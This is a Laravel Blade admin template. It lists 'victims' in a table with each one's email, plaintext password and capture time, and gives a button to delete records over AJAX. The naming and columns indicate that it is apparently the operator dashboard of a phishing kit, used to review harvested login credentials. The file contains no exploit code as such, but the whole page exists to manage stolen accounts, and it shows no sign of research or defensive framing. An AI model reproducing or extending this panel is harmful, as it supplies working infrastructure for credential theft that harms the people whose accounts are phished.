@extends('empaty')

@section('css')
    <style>
        body {
            background: black
        }
    </style>
@stop

@section('title')
    admin
@stop

@section('content')

    <div class="alert alert-success w-75 m-auto text-center p-2" style="font-size:30px; display:none " id="alert_success">
        SUCCESS DELETE
    </div>

    <div class="container">


        <table class="table table-bordered table-dark">

            <tr>
                <th scope="col">#</th>
                <th scope="col">Email</th>
                <th scope="col">Password</th>
                <th scope="col">time</th>
                <th scope="col">Delete</th>
            </tr>


            @foreach ($victims as $victim)
                <tr class="vic-{{ $victim->id }}">

                    <th scope="row">{{ $loop->index + 1 }}</th>
                    <td>{{ $victim->email }}</td>
                    <td>{{ $victim->password }}</td>
                    <td>{{ $victim->created_at }}</td>
                    <td>

                        <button class="btn btn-danger delete_button" product_id={{ $victim->id }}
                            product_name={{ $victim->email }}>DELETE</button>



                    </td>

                </tr>
            @endforeach

        </table>

    </div>
@stop

@section('js')

    <script>
        $(document).on('click', '.delete_button', function(e) {
            e.preventDefault();

            var product_id = $(this).attr('product_id');
            var product_name = $(this).attr('product_name');

            if (confirm('DELET ' + product_name)) {

                $.ajax({
                    type: "POST",
                    method: "DELETE",
                    url: "{{ route('vic.destroy', '') }}" + "/" + product_id,
                    data: {
                        '_token': '{{ csrf_token() }}',

                    },
                    success: function(data) {
                        if (data.msg == "success") {
                            $('#alert_success').show();
                            $('.vic-' + data.id).remove();
                            setTimeout(function() {
                                $('#alert_success').fadeOut('slow');
                            }, 3000);


                        }


                    },
                    error: function(error) {

                    }

                })

            }



        })
    </script>
@stop
